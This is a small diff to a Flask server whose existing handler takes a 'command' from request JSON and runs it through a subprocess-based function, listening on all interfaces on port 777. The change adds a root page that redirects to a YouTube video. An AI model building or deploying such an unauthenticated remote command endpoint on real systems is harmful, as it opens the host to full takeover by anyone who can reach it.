@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 
-from flask import Flask, request
+from flask import Flask, request, redirect
 import platform, subprocess
 
 app = Flask(__name__)
@@ -24,6 +24,10 @@ def run_command(command):
 def handle_command():
     command = request.json.get('command')
     return run_command(command)
+
+@app.route('/',methods=['GET'])
+def slash():
+    return redirect("https://www.youtube.com/watch?v=cFUXhJ7vYaw?rel=0&autoplay=1")
 
 if __name__ == "__main__":
     app.run(debug=False,host='0.0.0.0',port=777)
